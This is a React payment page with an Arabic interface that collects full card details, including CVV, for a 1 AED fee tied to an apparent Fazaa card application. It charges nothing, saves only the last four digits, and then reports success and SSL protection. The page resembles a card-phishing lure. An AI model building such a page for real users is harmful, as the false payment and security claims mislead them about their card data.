import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronRight, CreditCard, Lock } from "lucide-react";
import { base44 } from "@/api/base44Client";
import StepProgress from "@/components/StepProgress";

export default function Payment() {
  const navigate = useNavigate();
  const [form, setForm] = useState({ card_number: "", card_holder: "", expiry: "", cvv: "" });
  const [loading, setLoading] = useState(false);

  const handleChange = (field, value) => setForm((p) => ({ ...p, [field]: value }));

  const formatCardNumber = (val) =>
    val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

  const formatExpiry = (val) => {
    const cleaned = val.replace(/\D/g, "").slice(0, 4);
    if (cleaned.length >= 3) return cleaned.slice(0, 2) + "/" + cleaned.slice(2);
    return cleaned;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    const appId = localStorage.getItem("card_app_id");
    if (appId) {
      await base44.entities.CardApplication.update(appId, {
        current_step: "completed",
        status: "completed",
        card_holder: form.card_holder,
        card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
      });
      localStorage.removeItem("card_app_id");
    }
    setLoading(false);
    alert("تم الدفع بنجاح! شكراً لك.");
    navigate("/");
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <StepProgress currentStep="payment" />

      {/* Header */}
      <div className="bg-white border-b border-gray-100 px-5 py-4 flex items-center gap-3">
        <button onClick={() => navigate(-1)} className="text-gray-500 hover:text-foreground transition-colors">
          <ChevronRight className="w-5 h-5" />
        </button>
        <h1 className="text-base font-bold text-foreground">الدفع الآمن</h1>
        <Lock className="w-4 h-4 text-green-500 mr-auto" />
      </div>

      {/* Summary Card */}
      <div className="px-5 pt-5">
        <div className="bg-white rounded-2xl border border-gray-100 shadow-sm p-4 flex items-center gap-3 mb-5">
          <div className="w-10 h-10 bg-yellow-50 rounded-xl flex items-center justify-center">
            <CreditCard className="w-5 h-5 text-yellow-600" />
          </div>
          <div className="flex-1">
            <p className="text-sm font-bold text-foreground">رسوم بطاقة فزعة</p>
            <p className="text-xs text-muted-foreground">رسوم تأكيد الطلب</p>
          </div>
          <span className="text-base font-bold text-foreground">١ د.إ</span>
        </div>
      </div>

      {/* Payment Form */}
      <div className="flex-1 px-5 pb-8">
        <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-5">
          <p className="text-sm font-semibold text-foreground mb-4">بيانات البطاقة</p>

          <form onSubmit={handleSubmit} className="flex flex-col gap-3">
            <div>
              <label className="text-xs text-gray-500 mb-1 block">رقم البطاقة</label>
              <input
                type="text"
                inputMode="numeric"
                placeholder="0000 0000 0000 0000"
                value={form.card_number}
                onChange={(e) => handleChange("card_number", formatCardNumber(e.target.value))}
                className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-right placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white tracking-widest"
                required
              />
            </div>

            <div>
              <label className="text-xs text-gray-500 mb-1 block">اسم صاحب البطاقة</label>
              <input
                type="text"
                placeholder="الاسم كما هو على البطاقة"
                value={form.card_holder}
                onChange={(e) => handleChange("card_holder", e.target.value)}
                className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-right placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
                required
              />
            </div>

            <div className="flex gap-3">
              <div className="flex-1">
                <label className="text-xs text-gray-500 mb-1 block">تاريخ الانتهاء</label>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="MM/YY"
                  value={form.expiry}
                  onChange={(e) => handleChange("expiry", formatExpiry(e.target.value))}
                  className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-center placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
                  required
                />
              </div>
              <div className="flex-1">
                <label className="text-xs text-gray-500 mb-1 block">CVV</label>
                <input
                  type="password"
                  inputMode="numeric"
                  placeholder="•••"
                  maxLength={4}
                  value={form.cvv}
                  onChange={(e) => handleChange("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
                  className="w-full border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-center placeholder:text-gray-400 focus:outline-none focus:border-primary bg-white"
                  required
                />
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 py-2">
              <Lock className="w-3.5 h-3.5 text-green-500" />
              <p className="text-xs text-gray-400">معاملاتك محمية بتشفير SSL</p>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full py-4 mt-1 text-base font-bold rounded-2xl text-white transition-all duration-300 hover:scale-[1.02] hover:shadow-lg active:scale-[0.98] disabled:opacity-70"
              style={{ background: 'linear-gradient(135deg, #c9a227 0%, #e6c84a 50%, #c9a227 100%)' }}
            >
              {loading ? "جارٍ المعالجة..." : "ادفع الآن ١ د.إ"}
            </button>
          </form>
        </div>

        {/* Accepted Cards */}
        <div className="flex items-center justify-center gap-3 mt-5">
          <span className="text-xs text-gray-400">نقبل:</span>
          <div className="flex gap-2">
            {["VISA", "MC", "AMEX"].map((card) => (
              <span key={card} className="text-xs font-bold border border-gray-200 rounded-lg px-2 py-1 bg-white text-gray-500">
                {card}
              </span>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}